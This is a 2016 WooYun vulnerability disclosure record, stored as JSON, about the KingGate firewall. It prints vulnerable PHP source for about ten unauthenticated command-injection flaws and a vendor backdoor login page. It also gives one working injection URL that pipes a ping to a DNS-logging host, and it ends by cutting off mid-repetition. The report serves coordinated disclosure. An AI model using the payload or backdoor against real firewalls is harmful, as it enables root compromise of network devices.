{"id": 87469, "wybug_id": "wooyun-2016-0180305", "wybug_title": "某防火墙N处远程命令执行和后门页面管理（基础代码审计）                                      ", "wybug_corp": "深圳金山信息安全技术有限公司", "wybug_author": "老虎皮", "wybug_date": "2016-03-03 02:00", "wybug_open_date": "2016-06-05 17:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-10：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向公众公开  简要描述： 一次性全部打包，通杀完 详细说明：  无需登录，远程任意命令执行（root权限)，直接撸穿源代码，随意控制防火墙该设计缺陷新旧版本的KingGate防火墙通杀 \n\n \n\n通过案例一 **.**.**.**/bugs/wooyun-2016-0176999 我已经撸到了源代码在对源代码审计过程中发现N枚无需登录的远程命令执行漏洞第一处 命令执行\\src\\application\\log\\viewauditmail.php关键性代码如下：\n<?php // 页面显示后台配置部分\trequire(\"../../lib/public.inc\");\trequire(\"../../lib/log.inc\");\trequire(\"../../lib/page_db.inc\");\trequire(\"../../lib/session_check.inc\");\t\t$_GET[\"IG_localfile\"]=zr_getFilename();\t\t\t//\t当前文件名\t$IG_current_deep=zr_path_deep();\t$jumpToRootpath=zr_JumpToRoot();\t\t\t\t\t\t//\t到根目录的跳数\t$thema_name=\"default\";\t$theme=zr_getTheme($thema_name);\t\t\t\t\t\t//\t主题\t$IG_pagenum=12;\tif ($IG_date == \"\")\t\t$IG_date=date(\"Y-m-d\");\tif ($IG_date == date(\"Y-m-d\"))\t\t$table_name = \"audit_smtp\";\telse{\t\t$a =  split(\"-\",$IG_date);\t\t$y = $a[0];\t\t$m = $a[1];\t\t$d = $a[2];\t\t$table_name = \"audit_smtp\".$y.$m.$d;\t }    $IG_MailIDs = \"\";\tif ($REQUEST_METHOD == \"POST\"){\t\tif ($IG_opertype == \"AUDIT\"){\t\t\tfor ($i=0; $i<$IG_pagenum; $i++){\t\t\t\tif ($_POST['chkbox'.$i] != \"\"){\t\t\t\t\t$IG_cmd=\"/usr/local/sbin/mailsend -i \".$_POST['chkbox'.$i].\" -t $table_name >/dev/null 2>/dev/null &\";\t\t\t\t\t//echo $IG_cmd.\"<br>\";\t\t\t\t\tsystem($IG_cmd);\n其中此处由于$_POST['chkbox'.$i]未过滤，造成命令执行\n$IG_cmd=\"/usr/local/sbin/mailsend -i \".$_POST['chkbox'.$i].\" -t $table_name >/dev/null 2>/dev/null &\";\t\t\t\t\t//echo $IG_cmd.\"<br>\";\t\t\t\t\tsystem($IG_cmd);\n第二处：src\\application\\firewall\\schedule.php\n<?php  \trequire(\"../../lib/public.inc\");\t\trequire(\"../../lib/session_check.inc\");\t\t\t$_GET[\"IG_localfile\"]=zr_getFilename();\t\t\t//\t当前文件名\t$IG_current_deep=zr_path_deep();\t\t\t\t\t\t\t\t\t\t$jumpToRootpath=zr_JumpToRoot();\t\t\t\t//\t到根目录的跳数\t?>\t<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"><?php  \t$_GET[\"IG_dir\"]=\"/etc/infogate/tmpconf/\";\t\t\t\t\t\t\t\t//\t配置文件根目录\t$_GET[\"IG_promptfile\"]=\"\";\t\t\t\t\t\t\t\t\t\t//\t语言配置文件\t$_GET[\"IG_pagenum\"]=2;\t\t\t\t\t\t\t\t\t\t\t//\t每页条数\t$_GET[\"IG_dir\"]=\"/etc/infogate/firewall/time/\";\t\tif(!file_exists($_GET[\"IG_dir\"])){\t\t$cmd=\"目录不存在!\";\t\tshowmsg($cmd);\t\t\t}\t\t\t$d = dir($_GET[\"IG_dir\"]);\t\t$_GET[\"IG_pagenum\"]=15;\t$IG_COUNT_TIME_NAME=0;\t\twhile (false !== ($entry = $d->read())) {    \t\tif( preg_match(\"/(^\\.$)|(^\\.\\.$)/\",$entry) ){    \t\t\tcontinue;\t\t} \t\t$IG_TIME_FILENAME[$IG_COUNT_TIME_NAME]=$entry;\t\t$IG_COUNT_TIME_NAME ++;\t}    if(!isset($IG_pageno))  \t$IG_pageno=0;   \tfor ($i=($IG_pageno*$_GET[\"IG_pagenum\"]); $i<($IG_pageno*$_GET[\"IG_pagenum\"] + $_GET[\"IG_pagenum\"]); $i++){    \t\t$lines=file($_GET[\"IG_dir\"].\"/\".$IG_TIME_FILENAME[$i]);    \t \tforeach ($lines as $line_num => $line) {    \t    \t\t $ZR_TIME_ARRAY = preg_split(\"/=/\",trim($line), 8, PREG_SPLIT_NO_EMPTY);    \t\t     \t\t if(($ZR_TIME_ARRAY[1]=trim($ZR_TIME_ARRAY[1]))==\"default\")    \t\t \t \t$IG_TIME_INFO[$i.trim($ZR_TIME_ARRAY[0])]=\"\";    \t\t else\t    \t\t \t\t$IG_TIME_INFO[$i.trim($ZR_TIME_ARRAY[0])]=$ZR_TIME_ARRAY[1];    \t\t    \t\t}    \t\t} \t$d->close();\t\tif ($REQUEST_METHOD== \"POST\"){\t\t$IG_pageno=1;\t\t$IG_operation=trim($_POST['IG_operation']);\t\t\tif($IG_operation == \"IG_delete\"){\t\t\t// 防火墙规则文件\t\t\t$IG_accessfile=\"/etc/infogate/firewall/access.conf\";\t\t\t$IG_appaccessfile=\"/etc/infogate/firewall/appaccess.conf\";\t\t\t// 时间段是否已在防火墙中使用\t\t\t$flag_norepeat=true;\t\t\t$IG_error_msg=\"\";\t\t\t\t\t\tfor($i=0; $i<=$_GET[\"IG_pagenum\"]; $i++){\t\t\t\t$flag=true;\t\t\t\t$IG_str=trim($_POST['IG_checkbox'.$i]);\t\t\t\t\tif ($IG_str != \"\"){\t\t\t\t\t\t// 在防火墙规则配置文件中找此时间配置,如果存在,则不能删除\t\t\t\t\t\t$IG_error_msg=\"\";\t\t\t\t\t\t$IG_rulinfo=locaterecord($IG_accessfile, 12, 4, $IG_str, \"|\");\t// 访问控制\t\t\t\t\t\tif ($IG_rulinfo[0] != \"\"){\t\t\t\t\t\t\t$IG_error_msg=$IG_str.\" 已在访问控制中应用，不能被删除！\";\t\t\t\t\t\t\t$flag=false;\t\t\t\t\t\t}\t\t\t\t\t\tif ($flag == true){\t\t\t\t\t\t\t$IG_rulinfo=locaterecord($IG_appaccessfile, 12, 4, $IG_str, \"|\");\t// 访问控制\t\t\t\t\t\t\tif ($IG_rulinfo[0] != \"\"){\t\t\t\t\t\t\t\t$IG_error_msg=$IG_str.\" 已在应用控制中应用，不能被删除！\";\t\t\t\t\t\t\t\t$flag=false;\t\t\t\t\t\t\t}\t\t\t\t\t\t}\t\t\t\t\t\t\t\t// 删除文件\t\t\t\t\tif($flag)\t\t\t\t   \t{\t\t\t\t\t\t$cmd = \"rm \".$_GET[\"IG_dir\"].$IG_str.\" -f\";\t\t\t\t\t\tsystem($cmd);\t\t\t\t\t\t$IG_cmd=\"sync > /dev/null\";\t\t\t\t\t\tsystem($cmd);\n关键代码\n$cmd = \"rm \".$_GET[\"IG_dir\"].$IG_str.\" -f\";\t\t\t\t\t\tsystem($cmd);\n直接执行，get获取值只要满足如下条件利用方式如下：**.**.**.**/src/application/firewall/schedule.php?IG_pagenum=5&IG_dir=a|ping werwrer3.xxxx.dnslog.info postdata:IG_operation=IG_delete&IG_checkbox=1如图\n\ncloudeye收到的dns解析请求（证明命令执行）\n\n第三处命令执行：src\\application\\vpn\\tab\\tab_show_ipsec_tunnellist.php关键代码\nif ($_SERVER['REQUEST_METHOD'] == \"POST\"){\tfor($IG_i=0; $IG_i< $IG_pagenum; $IG_i++)\t{\t\t$IG_tunnelname=trim($_POST['IG_chbox'.$IG_i]);\t\tif ($IG_tunnelname != \"\"){\t\t\t//showmsg($IG_str);//注意是否要加上($IG_str!=\"\")\t\t\t$IG_tunnelstarted=checktunnelstarted($IG_tunnelname);\t\t\tif ($IG_tunnelstarted==1){\t\t\t\t$IG_prompt=GetPrompt($IG_promptfile, $IG_localfile, \"tunnelisrunning\", \"隧道已启用，请停止再删除！\");\t\t\t\tshowmsg($IG_tunnelname.$IG_prompt);\t\t\t\t//continue;\t\t\t}else{\t\t\t\t$IG_basedir=\"/etc/infogate/VPN/ipsec.d/zr_user\";\t\t\t\t$IG_tunnelfile = $IG_basedir.\"/##\".$IG_tunnelname.\".ui\";\t\t\t\t$IG_secretfile=$IG_basedir.\"/##\".$IG_tunnelname.\".secrets\";\t\t\t\tif (file_exists($IG_tunnelfile)){\t\t\t\t\tunlink($IG_tunnelfile);\t\t\t\t\tunlink($IG_secretfile);\t\t\t\t}\t\t\t\t$IG_tunnelfile = $IG_basedir.\"/\".$IG_tunnelname.\".ui\";\t\t\t\t$IG_secretfile=$IG_basedir.\"/\".$IG_tunnelname.\".secrets\";\t\t\t\tif (file_exists($IG_tunnelfile)){\t\t\t\t\tunlink($IG_tunnelfile);\t\t\t\t\tunlink($IG_secretfile);\t\t\t\t}\t\t\t\t\t$IG_cmd=\"/usr/local/super/bin/super ipsec auto --down\".\" \".$IG_tunnelname.\" > /dev/null\";\t\t\t\tsystem($IG_cmd,$retv);\t\t\t\t$IG_cmd=\"/usr/local/super/bin/super  ipsec auto --delete $IG_tunnelname > /dev/null\";\t\t\t\tsystem($IG_cmd);\n可执行地方为\n$IG_cmd=\"/usr/local/super/bin/super ipsec auto --down\".\" \".$IG_tunnelname.\" > /dev/null\";\t\t\t\tsystem($IG_cmd,$retv);\n跟踪该变量$IG_tunnelname\n$IG_tunnelname=trim($_POST['IG_chbox'.$IG_i]);\n同理，post可控即可造成命令执行第四处：src\\application\\log\\stat_virus_name.php\n$IG_dir=\"/var/log/infogate/\";\t$IG_top=$_POST['IG_top'];\t$IG_sdate=zr_trim($_POST['IG_s_date'], \"-\");\t$IG_edate=zr_trim($_POST['IG_edate'], \"-\");\t\t$IG_cmd=\"/boot/sbin/infogate/getsort.sh -v -n \".$IG_sdate.\" \".$IG_edate.\" > /dev/null\";//\techo $IG_cmd;\tsystem($IG_cmd, $IG_status);\n其中$IG_sdate 可控，同理命令执行第四处：\\src\\application\\vpn\\tab\\tab_show_ipsec_status.php\n$IG_tunnelname=$_GET['IG_tunnelname'];$IG_type=$_GET['IG_type'];if ($IG_type == \"start\"){\t// 修改文件名\t$IG_tunnelfile2=$IG_basedir.\"/##\".\"$IG_tunnelname\".\".ui\";\tif (file_exists($IG_tunnelfile2)){\t\t$IG_tunnelfile=$IG_basedir.\"/$IG_tunnelname\".\".ui\";\t\trename($IG_tunnelfile2, $IG_tunnelfile);\t}\t\t$IG_secretfile2=$IG_basedir.\"/##\".$IG_tunnelname.\".secrets\";\tif (file_exists($IG_secretfile2)){  \t\t$IG_secretfile=$IG_basedir.\"/$IG_tunnelname\".\".secrets\";  \t\trename($IG_secretfile2, $IG_secretfile);\t}\t$IG_tunnelstarted=checktunnelstarted($IG_tunnelname);////\tif ($IG_tunnelstarted==1) {\t\t$IG_prompt=GetPrompt($IG_promptfile, $IG_localfile, \"tunnelrunning\", \"隧道已启用！\");\t\tshowmsg(\"$IG_prompt\");\t}else {\t\t\t\t\t\t\t$IG_cmd = \"/usr/local/sbin/create_ipsec_tunnel.sh /etc/infogate/VPN/ipsec.d/zr_user/\";\t\t\tsystem($IG_cmd,$retv);\t\t\t\t\t   \t\t$IG_cmd = \"  /usr/local/sbin/create_ipsec_secrets.sh /etc/infogate/VPN/ipsec.d/zr_user/\";\t\t\tsystem($IG_cmd,$retv);\t\t\t   \t\t\t$IG_cmd=\"/usr/local/super/bin/super  ipsec auto --delete\".\" \".$IG_tunnelname.\" > /dev/null\";\t\t\tsystem($IG_cmd,$retv);\n其中$IG_tunnelname = $IG_tunnelname=$_GET['IG_tunnelname'];  直接执行命令第五出：\\src\\application\\vpn\\tab\\tab_show_c-to-s_status.php\n$IG_type=$_GET['IG_type'];\tif ($IG_type == \"close\"){\t\t$IG_pid = $_GET['IG_pid'];\t\t$IG_cmd=\"kill $IG_pid > /dev/null\";\t\tsystem($IG_cmd)\t;\t\t\t}?>\n第6处：src\\application\\firewall\\getadress.php\nif(empty($IG_ipaddr)||$IG_ipaddr==\"\"){\t\t\t\t\t\t\t\t\t\tshowmsg(\"请选输入启始IP\");\t\t\t\t\t\t\t\t\t\t}else\tif(empty($card_eth_name)||$card_eth_name==\"\"){\t\t\t\t\t\t\t\t\t\tshowmsg(\"请选择接口\");\t\t\t\t\t\t\t\t\t\t}else\tif(empty($IG_ipaddr2)||$IG_ipaddr2==\"\"){\t\t\t\t\t\t\t\t\t\tshowmsg(\"请选输入结束IP\");\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t\t\t\tif(empty($IG_isScan)){//是否扫描地址设置中已存在的地址\t\t\t\t\t\t$IG_flag=\"0\";\t\t\t\t\t\t$cmd=\"/usr/local/sbin/getiplist -s $IG_ipaddr -e $IG_ipaddr2 -i $card_eth_name -f $IG_batchfile -c\";\t\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t$IG_flag=$IG_isScan;\t\t\t\t\t\t$cmd=\"/usr/local/sbin/getiplist -s $IG_ipaddr -e $IG_ipaddr2 -i $card_eth_name -f $IG_batchfile\";\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t//$cmd=\"/usr/local/sbin/getiplist -s $IG_ipaddr -e $IG_ipaddr2 -i $card_eth_name -f $IG_batchfile\";\t\t\t\t\t//echo $cmd.\"<br>\";\t\t\t\t\tsystem($cmd);\n第7处：\\src\\system\\update.php\n20 \t$zr_debug=0;21 \t22 \tif ($REQUEST_METHOD==\"POST\"){23 \t\t$IG_filename=\"/var/log/infogate/upload/\".$_FILES['IG_uploadfile']['name'];24 \t\techo $IG_filename;exit();25 \t\t#/usr/local/thttpd/src/system/26 27 \t\t$_GET[\"IG_opertime\"]=date(\"Y-m-d H:i:s\");28 \t\t$_GET[\"IG_clientIP\"]=getIP();29 \t\tif(($_FILES['IG_uploadfile']!=\"none\")&&($_FILES['IG_uploadfile']!=\"\")){30                 31 \t\tif($GLOBALS[\"zr_debug\"])32          33 \t\tshowmsg(\"�ļ��ϴ������룺\".$_FILES['IG_uploadfile']['error']);34 \t\t\t\t\t35 \t\t\tif(copy($_FILES['IG_uploadfile']['tmp_name'],$IG_filename)){36 \t\t\t37 \t\t\tif($GLOBALS[\"zr_debug\"])38 \t\t\tshowmsg(\"copy�ɹ�����\".$_FILES['IG_uploadfile']['error']);39 40 \t\t\t//070307 -- //Ԭ��˵�ڽ�ѹ��ǰ �����update-2.2Ŀ¼41 \t\t\t$IG_cmd=\"rm /var/program/update-2.2 -rf > /dev/null\";42 \t\t\tsystem($IG_cmd);43 44 \t\t\t\t$IG_cmd=\"tar zxvf \".$IG_filename.\" -C \".\"/var/program/ > /dev/null\";45                                 #echo $IG_cmd;exit();46 \t\t\t\tsystem($IG_cmd);\n第8处：\\src\\application\\firewall\\editschedule.php\nif ($REQUEST_METHOD == \"GET\"){\t\t\t\tif ($_GET[\"IG_timeID\"] == \"\")\t\texit();\t\t$IG_filename=$_GET[\"IG_dir\"].$_GET[\"IG_timeID\"];\t\t\t\t\tif (!file_exists($IG_filename)) {    \t\t    \t\t\t\tshowmsg(\"时间配置文件\".$_GET[\"IG_timeID\"].\"\\\\n不存在！\");\t\t\t\thistoryback();\t\t\t} \t\t\telse{\t\t\t\t// 时间信息数组\t\t\t\t$IG_timeinfo=array();\t\t\t\t\t\t\t$lines=file($IG_filename);\t\t\t\tforeach ($lines as $line_num => $line) \t\t\t\t{\t\t\t\t\t$ZR_TIME_ARRAY = preg_split(\"/=/\",trim($line), 8, PREG_SPLIT_NO_EMPTY);\t\t\t\t\t\t$IG_timeinfo[trim($ZR_TIME_ARRAY[0])]=trim($ZR_TIME_ARRAY[1]);\t\t\t\t}\t \t\t}\t \t}\telse if ($_SERVER['REQUEST_METHOD'] == \"POST\"){\t\t$IG_filename_tmp=$_GET[\"IG_dir_tmp\"].$_POST[\"IG_timeID\"];\t\t$IG_filename=$_GET[\"IG_dir\"].$_POST[\"IG_timeID\"];\t\t\t$IG_time_str=\"\";\t\t\t\t// 起始时间\t\t\t$IG_TimeStart=\"$IG_HourStart:$IG_MinStart\";\t\t\t$IG_TimeStop=\"$IG_HourStop:$IG_MinStop\";\t\t\tif (! (($IG_TimeStart == \"00:00\")&&($IG_TimeStop == \"00:00\")) ){\t\t\t\t$IG_time_str.=\"timestart=\".$IG_TimeStart.\"\\n\";\t\t\t\t\t$IG_time_str.=\"timestop=\".$IG_TimeStop.\"\\n\";\t\t\t\t}\t\t\t\t//星期\t\t\t$IG_days=\"\";\t\t\tfor ($i=0; $i<7; $i++){\t\t\t\t$IG_tmpstr=trim($_POST['IG_checkbox'.$i]);\t\t\t\tif ($IG_tmpstr != \"\"){\t\t\t\t\tif ($IG_days != \"\")\t\t\t\t\t\t$IG_days .=\",\";\t\t\t\t\t$IG_days .=$IG_tmpstr;\t\t\t\t\t}\t\t\t\t\t\t}\t\t\tif($IG_days!=\"\"){\t\t\t\t$IG_time_str.=\"days=\".$IG_days.\"\\n\";\t\t\t}\t\t\t\t\t// 起始日期\t\t\t\tif( ! ($IG_DateStart==\"\" && $IG_DateStop==\"\" ) )\t\t\t{\t\t\t\t$IG_DateStart=str_replace('-', ':', $IG_DateStart);\t\t\t\t$IG_DateStop=str_replace('-', ':', $IG_DateStop);\t\t\t\t$IG_time_str.=\"datestart=\".$IG_DateStart.\"\\n\";\t\t\t\t$IG_time_str.=\"datestop=\".$IG_DateStop.\"\\n\";\t\t\t}\t\t\t\t\t\t// memo\t\t\t$IG_time_str.=\"memo=\".$IG_Memo.\"\\n\";\t\t// 日志记录\t\t$_GET[\"IG_opertime\"]=date(\"Y-m-d H:i:s\");\t\t$_GET[\"IG_clientIP\"]=getIP();\t\t$IG_logmsg=$_GET[\"IG_clientIP\"].\"|\".$_GET[\"IG_opertime\"].\"|\".$IG_loginname.\"|防火墙|时间段|修改时间段设置\";\t\taddMsgtoFile($IG_MANAGEOPERLOG, $IG_logmsg);\t\t\t$handle = fopen ($_GET[\"IG_dir_tmp\"].\"/\".$_POST[\"IG_timeID\"], \"w\");\t\t// 将$somecontent写入到我们打开的文件中。\t\t    if (!fwrite($handle,$IG_time_str)) {\t\t\tshowmsg( \"不能写入到文件 $filename\");\t\t\t\t\techo \"<script language=\\\"JavaScript\\\">\\n<!--\\n\";\t\t\t\t\t\techo \"location.href=\\\"schedule.php\\\";\\n\";\t\t\t\t\t\techo \"// -->\\n</script>\\n\"; \t\t    }\t\t    fflush($handle);\t\t    fclose($handle);\t\t\t\t\t\t$IG_cmd=\"mv \".$IG_filename_tmp.\" \".$IG_filename.\" >/dev/null 2>/dev/null\";\t\tsystem($IG_cmd);\n第9处：src/application/virus/sortbyname.php\n$IG_dir=\"/var/log/infogate/scanvir/\";\t$IG_top=$_POST['IG_top'];\t$IG_sdate=zr_trim($_POST['IG_s_date'], \"-\");\t$IG_edate=zr_trim($_POST['IG_e_date'], \"-\");\t\t$IG_cmd=\"/usr/local/sbin/wingetsort.sh -n \".$IG_sdate.\" \".$IG_edate;//\techo $IG_cmd;\tsystem($IG_cmd, $IG_status);\t\t$IG_filename=$IG_dir.\"virusname.sort\";\n第10处：src/application/virus/sortbyip.php\n$IG_dir=\"/var/log/infogate/scanvir/\";\t$IG_top=$_POST['IG_top'];\t$IG_sdate=zr_trim($_POST['IG_s_date'], \"-\");\t$IG_edate=zr_trim($_POST['IG_e_date'], \"-\");\t\t$IG_cmd=\"/usr/local/sbin/wingetsort.sh -i \".$IG_sdate.\" \".$IG_edate;//\techo $IG_cmd;\tsystem($IG_cmd, $IG_status);\n第11处 官方后门：src/system/backdoor.php\n<?php\tif(isset($_POST[\"session_id\"]))\t\tsession_id($_POST[\"session_id\"]);\t\t\t\tsession_start();\t\t\t$sid=session_id();\t\tif (!isset($IG_login)){\t\tsession_register(\"IG_login\");\t\tsession_register(\"IG_loginname\");\t\tsession_register(\"IG_f_manageuser\");\t\tsession_register(\"IG_f_viewsysconf\");\t\tsession_register(\"IG_f_modifysysconf\");\t\tsession_register(\"IG_f_viewsyslog\");\t\tsession_register(\"IG_logincount\");\t\tsession_register(\"IG_backdoor_user\");\t\t//echo \"32 backdoor>>  IG_backdoor_user >>>\".$IG_backdoor_user;\t\t//TAB 页显示当前菜单路径  如：”系统配置 > 网络设置“\t\tsession_register(\"IG_current_menu_name\");\t\tsession_register(\"IG_current_submenu_name\");\t\t$IG_logincount=0;\t\t$IG_login=false;\t\t$IG_loginname=\"\";\t\t$IG_f_manageuser=\"0\";\t\t$IG_f_viewsysconf=\"0\";\t\t$IG_f_modifysysconf=\"0\";\t\t$IG_f_viewsyslog=\"0\";\t\t$IG_backdoor_user=true; //后门登录的用户不记录操作日志\t}\telse{\t\t//$_SESSION[\"IG_backdoor_user\"]=true;\t\tsession_register(\"IG_backdoor_user\");\t\t\t$IG_backdoor_user = true ;\t}\t  \t  \trequire(\"../lib/public.inc\");  \t\t$jumpToRootpath=zr_JumpToRoot();\t\t\t\t\t\t//\t到根目录的跳数\t$thema_name=\"default\";\t$theme=zr_getTheme($thema_name);\t\t\t\t\t\t//\t主题\t\tif ($REQUEST_METHOD == \"POST\"){\t\t\t$_GET[\"IG_opertime\"]=date(\"Y-m-d H:i:s\");\t\t$_GET[\"IG_clientIP\"]=getIP();\t\t$IG_logincount += 1;\t\t$IG_user_ip=$IG_clientIP;\t\t$IG_userinfo=zr_login_bridge(\"/etc/infogate/center/defaultclient.conf\", $_POST[\"IG_user\"], $_POST[\"IG_passwd\"],$IG_user_ip);\t\t\tif($IG_userinfo==\"ok\"){\t\t\t$IG_login=true;\t\t\t$IG_loginname=$IG_user;\t\t\t$IG_permission=$IG_userinfo;\t\t\t/*\t\t\t$IG_f_manageuser=substr($IG_permission, 0, 1);\t\t\t$IG_f_viewsysconf=substr($IG_permission, 1, 1);\t\t\t$IG_f_modifysysconf=substr($IG_permission, 2, 1);\t\t\t$IG_f_viewsyslog=substr($IG_permission, 3, 1);\t\t\t*/\t\t\t\t\t\t//后门用户 有所有权限\t\t\t$IG_f_manageuser=1;\t\t\t$IG_f_viewsysconf=1;\t\t\t$IG_f_modifysysconf=1;\t\t\t$IG_f_viewsyslog=1;\t\t\t\t\t\t$IG_logmsg=$_GET[\"IG_clientIP\"].\"|\".$_GET[\"IG_opertime\"].\"|\".$IG_loginname.\"|system login| |$IG_loginname login success!\";\t\t\t//addMsgtoFile($IG_MANAGEOPERLOG, $IG_logmsg);\t\t\t\t\t\tsession_register(\"IG_s_cards_num\");\t\t\t\t//\t设备网卡数 \t\t\t$IG_s_cards_num=zr_get_cards_num();\t\t\t\t\t\tHeader(\"Location: ../../index.php?s_id=$sid\");\t\t}\t\telse\t\t\tshowmsg(\"登陆失败 原因:\".$IG_userinfo);\t}?><html><head><?php\techo \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\">\";?><title><? echo zr_get_html_title_name(); ?></title><link href=\"<?echo $theme?>/css/myclass.css\" rel=\"stylesheet\" type=\"text/css\"></head><body leftmargin=\"0\" topmargin=\"0\"><div align=\"left\"><img src=\"<?echo $theme?>/images/title.jpg\" border=1></div><?php\tif ($IG_logincount >= 3){\t\techo \"<div align=\\\"center\\\"><font color=\\\"#666666\\\" size=\\\"5\\\"><b>login fail count than 3!</b></font></div>\";\t\texit();\t}?><br><br><br><br><br><br><table class=submodbg width=\"300\" align=center cellSpacing=1 cellPadding=4>\t<form method=\"POST\" action=\"<?echo $_SERVER[\"PHP_SELF\"]?>\" >\t<input type=\"hidden\" name=\"session_id\" value=\"<?echo $sid?>\" >\t\t<tr class=RowColor1>  \t\t\t<td class=tablehdtop colSpan=2 height=\"25\" align=\"center\">用户登录</td>\t\t</tr>\t\t<tr class=RowColor1>  \t\t\t<td class=\"tablehd\" align=\"right\">用户名</td>  \t\t\t<td><input type=\"text\" name=\"IG_user\" size=\"20\" maxsize=\"50\"></td>\t\t</tr>\t\t<tr class=RowColor1>\t\t\t<td class=\"tablehd\" align=\"right\">密码</td>\t\t\t<td><input type=\"password\" name=\"IG_passwd\" size=\"20\" maxsize=\"50\"></td>\t\t</tr>\t\t<tr class=RowColor1>\t\t\t<td colSpan=2 align=\"center\">\t\t\t\t<input class=\"BTNaction\" type=\"submit\" value=\"确认\" name=\"sutmit1\">\t\t\t\t<input class=\"BTNaction\" type=\"reset\" value=\"取消\" name=\"reset1\">\t\t\t</td>\t\t</tr>\t</form></table></body></html><?phpfunction zr_login_bridge($filename, $user_name, $user_passwd,$user_ip){\tif ($user_name == \"\"){\t\treturn \"|usernameempty|\";\t}\t\t$handle=file_exists($filename);\tif (! $handle){\t\treturn \"|filenotexist|\";\t\t}\t$handle=fopen($filename, \"r\");\tif (! $handle){\t\treturn \"|openfail|\";\t\t}\t$counter=0;\t\t$result_msg=\"\";\t//够着配置文件数组\t$conf_array=array();\t$lines = file($filename);\tforeach ($lines as $line_num => $line) {\t\t$line=trim($line);\t\tif($line==\"\")\t\t\tcontinue;\t\t\t$temp_array=explode(\"=\",$line);\t\t$key=trim($temp_array[0]);\t\t$value=trim($temp_array[1]);\t\t$conf_array[$key]=$value;\t}\t\t//校验\tif(strcmp($user_name,$conf_array[\"loginname\"])!=0)\t\treturn $result_msg=\"|usernotexist|\";\tif(strcmp($user_passwd,$conf_array[\"password\"])!=0)\t\treturn $result_msg=\"|password_error!|\";\tif($conf_array[\"enabled\"]!=1)\t\treturn $result_msg=\"|you'r not allowed to access!|\";\t\t/*\telse if(substr_count($conf_array[\"clientip\"],$user_ip)==0)\t\treturn $result_msg=\"|your ip is not allowed to access!|\";\t*/\telse \t\treturn \"ok\";\t}?>\n默认带有的后门管理员账号和密码储存在/etc/infogate/center/defaultclient.conf文件中\n\n受影响的如下列表：**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.phphttps://**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.phphttps://**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**:8443/src/system/login.php**.**.**.**/src/system/login.php**.**.**.**:8443/src/system/login.php   漏洞证明：  无需登录，远程任意命令执行（root权限)，直接撸穿源代码，随意控制防火墙该设计缺陷新旧版本的KingGate防火墙通杀该设计缺陷新旧版本的KingGate防火墙通杀 \n\n \n\n通过案例一 **.**.**.**/bugs/wooyun-2016-0176999 我已经撸到了源代码在对源代码审计过程中发现N枚无需登录的远程命令执行漏洞第一处 命令执行\\src\\application\\log\\viewauditmail.php关键性代码如下：\n<?php // 页面显示后台配置部分\trequire(\"../../lib/public.inc\");\trequire(\"../../lib/log.inc\");\trequire(\"../../lib/page_db.inc\");\trequire(\"../../lib/session_check.inc\");\t\t$_GET[\"IG_localfile\"]=zr_getFilename();\t\t\t//\t当前文件名\t$IG_current_deep=zr_path_deep();\t$jumpToRootpath=zr_JumpToRoot();\t\t\t\t\t\t//\t到根目录的跳数\t$thema_name=\"default\";\t$theme=zr_getTheme($thema_name);\t\t\t\t\t\t//\t主题\t$IG_pagenum=12;\tif ($IG_date == \"\")\t\t$IG_date=date(\"Y-m-d\");\tif ($IG_date == date(\"Y-m-d\"))\t\t$table_name = \"audit_smtp\";\telse{\t\t$a =  split(\"-\",$IG_date);\t\t$y = $a[0];\t\t$m = $a[1];\t\t$d = 